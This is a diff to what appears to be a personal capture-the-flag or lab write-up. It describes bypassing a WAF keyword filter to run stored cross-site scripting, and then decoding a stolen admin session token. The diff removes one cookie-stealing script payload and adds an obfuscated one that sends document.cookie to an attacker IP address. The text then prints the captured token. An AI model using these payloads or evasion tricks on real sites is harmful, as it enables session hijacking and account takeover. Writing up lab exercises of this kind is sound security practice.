@@ -65,8 +65,31 @@ So, send  `“<script>” , “var” , “btoa”`, and none of them activated 
 
 `“Document” and “Cookie”` don’t activate the WAF either,  but the string `“document.cookie”` does!
 
-Instead you can use `“document[‘cookie’]”`.
+Instead you can use the following way.
 
 ```
-<script>var i=new Image(); i.src=”http://<ATTACKING MACHINE>/?cookie="+btoa(document["cookie"]);</script>
+<script>var c='co'+'okie';document.location='http://10.8.113.198/?c='+document[c];</script>
 ```
+
+The ticket is successfully submitted.
+
+![[ticket_submmited.png]]
+
+
+#Attaking_Machine 
+On the python server you'll get several  base64 cookies.
+
+![[base64_coockie-1.png]]
+
+![[base64_coockie.png]]
+
+### Decode the cookie
+
+The code `eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.aQsgmg._fBHR0klajN3HOLV149jelwZyPc` can be decoded using https://www.jwt.io/.
+
+![[www.jwt.io.png]]
+> [!note]
+The code is an admin's token.
+
+
+
